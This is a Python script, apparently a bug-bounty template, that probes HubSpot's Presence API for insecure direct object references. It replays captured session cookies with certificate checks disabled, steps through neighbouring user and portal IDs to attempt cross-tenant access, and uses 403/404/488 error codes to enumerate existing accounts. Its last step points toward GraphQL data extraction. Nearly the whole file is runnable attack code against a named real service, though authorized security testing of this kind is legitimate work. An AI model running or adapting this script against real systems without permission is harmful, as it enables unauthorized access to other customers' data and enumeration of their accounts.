#!/usr/bin/env python3
"""
HubSpot Presence API IDOR Testing - Low-Privileged Account Template
Tests horizontal privilege escalation via user/portal ID manipulation
"""
import urllib.request
import ssl
import json

# ============================================================================
# CONFIGURATION - REPLACE WITH YOUR VALUES
# ============================================================================

HUBLET = "na2"  # Your hublet (check URL: app-na2.hubspot.com → na2)
PORTAL_ID = "YOUR_PORTAL_ID_HERE"  # Your portal ID (from URL after login)
USER_ID = "YOUR_USER_ID_HERE"  # Your user ID (from presence API capture)

# Cookies from browser (F12 → Network → presence request → Copy as cURL)
COOKIE_HEADER = """
PASTE_YOUR_COOKIES_HERE
""".strip()

# ============================================================================
# DO NOT EDIT BELOW
# ============================================================================

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

base_url = f"https://app-{HUBLET}.hubspot.com"

def test_presence(portal_id, user_id, test_name, description=""):
    """Test Presence API with different portal/user IDs"""
    # Build URL
    path = f"/api/presence/v1/presence/portal/{portal_id}/user/{user_id}"
    params = f"?hs_static_app=notifications&hs_static_app_version=1.11623&portalId={portal_id}"
    full_url = f"{base_url}{path}{params}"

    print(f"\n{'='*70}")
    print(f"TEST: {test_name}")
    if description:
        print(f"Description: {description}")
    print(f"Portal ID: {portal_id} | User ID: {user_id}")
    print('='*70)

    # Build request
    req = urllib.request.Request(full_url, method='PUT')
    req.add_header('Cookie', COOKIE_HEADER)
    req.add_header('Content-Type', 'application/json')
    req.add_header('Accept', 'application/json, text/javascript, */*; q=0.01')
    req.add_header('Accept-Language', 'en-US,en;q=0.5')
    req.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0')
    req.add_header('Origin', base_url)
    req.add_header('Referer', f'{base_url}/settings/{portal_id}/user-preferences/profile')

    # Empty body (or token if you have it)
    data = json.dumps({}).encode('utf-8')

    try:
        response = urllib.request.urlopen(req, data=data, context=ctx, timeout=10)
        status = response.status
        content = response.read().decode('utf-8')

        print(f"✓ Status: {status}")

        # Try to parse as JSON
        try:
            json_resp = json.loads(content)
            print(f"✓ JSON Response:")
            print(f"  {json.dumps(json_resp, indent=2)[:300]}")

            if status == 200:
                print(f"\n✓✓✓ SUCCESS - Resource accessible")
                if portal_id != PORTAL_ID or user_id != USER_ID:
                    print(f"⚠️⚠️⚠️ IDOR VULNERABILITY DETECTED!")
                    print(f"  Low-priv user accessed: Portal {portal_id}, User {user_id}")
                    print(f"  This is unauthorized access!")
                return True, status, 'SUCCESS'

        except json.JSONDecodeError:
            print(f"✓ Response (not JSON): {content[:200]}")
            return True, status, 'SUCCESS_TEXT'

    except urllib.error.HTTPError as e:
        print(f"✗ HTTP Error {e.code}: {e.reason}")

        # Try to read error response
        try:
            error_content = e.read().decode('utf-8')
            error_json = json.loads(error_content)
            print(f"  Error Response:")
            print(f"    {json.dumps(error_json, indent=4)}")

            # Interpret error codes for enumeration
            if e.code == 403:
                print(f"\n  ⚠️ FORBIDDEN - Resource exists but unauthorized")
                print(f"  → User/Portal {portal_id}/{user_id} exists!")
                print(f"  → Good for enumeration (403 vs 404)")
                return False, e.code, 'FORBIDDEN_EXISTS'

            elif e.code == 404:
                print(f"\n  ℹ️ NOT FOUND - Resource doesn't exist")
                print(f"  → User/Portal {portal_id}/{user_id} is invalid")
                return False, e.code, 'NOT_FOUND'

            elif e.code == 401:
                print(f"\n  ✗ UNAUTHORIZED - Cookies expired")
                print(f"  → Recapture cookies from browser")
                return False, e.code, 'UNAUTHORIZED'

            elif e.code == 488:
                print(f"\n  ⚠️ WRONG HUBLET - Portal exists elsewhere")
                if 'correctHublet' in error_json:
                    correct = error_json['correctHublet']
                    print(f"  → Portal {portal_id} is on hublet: {correct}")
                    print(f"  → Update HUBLET variable to: {correct}")
                return False, e.code, 'WRONG_HUBLET'

        except Exception:
            print(f"  Could not parse error response")

        return False, e.code, f'HTTP_{e.code}'

    except Exception as e:
        print(f"✗ Exception: {e}")
        return False, None, 'EXCEPTION'

# Main execution
if __name__ == "__main__":
    print("="*70)
    print("PRESENCE API - IDOR TESTING")
    print("="*70)
    print(f"Testing Account:")
    print(f"  Portal ID: {PORTAL_ID}")
    print(f"  User ID: {USER_ID}")
    print(f"  Hublet: {HUBLET}")
    print(f"  Cookie length: {len(COOKIE_HEADER)} chars")

    # ========================================================================
    # TEST 1: BASELINE - Your own user (should work)
    # ========================================================================
    print(f"\n{'#'*70}")
    print(f"# PHASE 1: BASELINE TEST")
    print(f"{'#'*70}")

    baseline_success, baseline_code, baseline_type = test_presence(
        PORTAL_ID,
        USER_ID,
        "Baseline - Own User",
        "Testing access to your own user presence (should succeed)"
    )

    if not baseline_success or baseline_type == 'UNAUTHORIZED':
        print(f"\n✗ BASELINE FAILED - Cannot proceed with IDOR testing")
        print(f"  Error: {baseline_type}")
        print(f"\n  Troubleshooting:")
        print(f"  1. Recapture cookies from browser (F12 → Network)")
        print(f"  2. Verify PORTAL_ID and USER_ID are correct")
        print(f"  3. Check HUBLET matches your login URL")
        exit(1)

    print(f"\n✓ BASELINE SUCCESS - Continuing with IDOR tests...")

    # ========================================================================
    # TEST 2: USER ID ENUMERATION (Horizontal Privilege Escalation)
    # ========================================================================
    print(f"\n{'#'*70}")
    print(f"# PHASE 2: USER ID IDOR TESTING")
    print(f"{'#'*70}")
    print(f"Objective: Test if low-priv user can access other users' data")

    user_idor_results = []

    # Test sequential user IDs
    test_offsets = [+1, +2, +5, +10, +100, -1, -2]

    for offset in test_offsets:
        test_user = str(int(USER_ID) + offset)
        success, code, result_type = test_presence(
            PORTAL_ID,
            test_user,
            f"User IDOR Test: ID {offset:+d}",
            f"Testing user ID {test_user} (offset {offset:+d})"
        )

        user_idor_results.append({
            'offset': offset,
            'user_id': test_user,
            'success': success,
            'code': code,
            'type': result_type
        })

    # ========================================================================
    # TEST 3: PORTAL ID ENUMERATION (Cross-Tenant Access)
    # ========================================================================
    print(f"\n{'#'*70}")
    print(f"# PHASE 3: PORTAL ID IDOR TESTING")
    print(f"{'#'*70}")
    print(f"Objective: Test multi-tenant isolation (cross-portal access)")

    portal_idor_results = []

    # Test different portal IDs
    test_portals = [
        (str(int(PORTAL_ID) + 1), "+1"),
        (str(int(PORTAL_ID) + 2), "+2"),
        (str(int(PORTAL_ID) + 10), "+10"),
        (str(int(PORTAL_ID) - 1), "-1"),
        ("100000000", "Low ID"),
    ]

    for test_portal, desc in test_portals:
        success, code, result_type = test_presence(
            test_portal,
            USER_ID,
            f"Portal IDOR Test: {desc}",
            f"Testing portal ID {test_portal}"
        )

        portal_idor_results.append({
            'portal_id': test_portal,
            'desc': desc,
            'success': success,
            'code': code,
            'type': result_type
        })

    # ========================================================================
    # RESULTS SUMMARY
    # ========================================================================
    print(f"\n{'='*70}")
    print("IDOR TESTING SUMMARY")
    print('='*70)

    # User IDOR Summary
    print(f"\n[USER ID IDOR RESULTS]")
    user_successes = [r for r in user_idor_results if r['success']]
    user_forbidden = [r for r in user_idor_results if r['type'] == 'FORBIDDEN_EXISTS']
    user_not_found = [r for r in user_idor_results if r['type'] == 'NOT_FOUND']

    print(f"  Total tests: {len(user_idor_results)}")
    print(f"  Successful access (200): {len(user_successes)}")
    print(f"  Forbidden (403): {len(user_forbidden)}")
    print(f"  Not found (404): {len(user_not_found)}")

    if user_successes:
        print(f"\n  ✗✗✗ CRITICAL VULNERABILITY: USER IDOR DETECTED")
        print(f"  Low-privileged user accessed other users:")
        for r in user_successes:
            print(f"    → User ID {r['user_id']} (offset {r['offset']:+d}): SUCCESS")
        print(f"\n  IMPACT: Horizontal privilege escalation")
        print(f"  SEVERITY: HIGH")

    elif user_forbidden:
        print(f"\n  ⚠️ User enumeration possible:")
        print(f"    403 (Forbidden) = User exists but unauthorized")
        print(f"    404 (Not Found) = User doesn't exist")
        print(f"  Users that exist but are forbidden:")
        for r in user_forbidden[:5]:
            print(f"    → User ID {r['user_id']}")

    # Portal IDOR Summary
    print(f"\n[PORTAL ID IDOR RESULTS]")
    portal_successes = [r for r in portal_idor_results if r['success']]
    portal_forbidden = [r for r in portal_idor_results if r['type'] == 'FORBIDDEN_EXISTS']
    portal_wrong_hublet = [r for r in portal_idor_results if r['type'] == 'WRONG_HUBLET']

    print(f"  Total tests: {len(portal_idor_results)}")
    print(f"  Successful access (200): {len(portal_successes)}")
    print(f"  Forbidden (403): {len(portal_forbidden)}")
    print(f"  Wrong hublet (488): {len(portal_wrong_hublet)}")

    if portal_successes:
        print(f"\n  ✗✗✗ CRITICAL VULNERABILITY: PORTAL IDOR DETECTED")
        print(f"  Low-privileged user accessed other portals:")
        for r in portal_successes:
            print(f"    → Portal ID {r['portal_id']}: SUCCESS")
        print(f"\n  IMPACT: Multi-tenant isolation BROKEN")
        print(f"  SEVERITY: CRITICAL")

    elif portal_wrong_hublet:
        print(f"\n  ⚠️ Portal enumeration via hublet errors:")
        for r in portal_wrong_hublet[:3]:
            print(f"    → Portal {r['portal_id']}: Exists on different hublet")

    # Final Assessment
    print(f"\n{'='*70}")
    print("FINAL ASSESSMENT")
    print('='*70)

    if user_successes or portal_successes:
        print(f"\n✗✗✗ IDOR VULNERABILITIES FOUND")
        print(f"\nFindings:")
        if user_successes:
            print(f"  1. USER IDOR: Can access {len(user_successes)} other users")
        if portal_successes:
            print(f"  2. PORTAL IDOR: Can access {len(portal_successes)} other portals")

        print(f"\nNext Steps:")
        print(f"  1. Document successful IDOR with screenshots")
        print(f"  2. Test with GraphQL for data extraction")
        print(f"  3. Prepare bug bounty report")

    else:
        print(f"\n✓ No IDOR vulnerabilities found")
        print(f"  Multi-tenant isolation appears to be working correctly")

        if user_forbidden or portal_forbidden:
            print(f"\n⚠️ However, enumeration is possible:")
            print(f"  Error codes reveal valid vs invalid resources")
            print(f"  This is still an information disclosure issue")

    print(f"\n{'='*70}")
    print("TESTING COMPLETE")
    print('='*70)
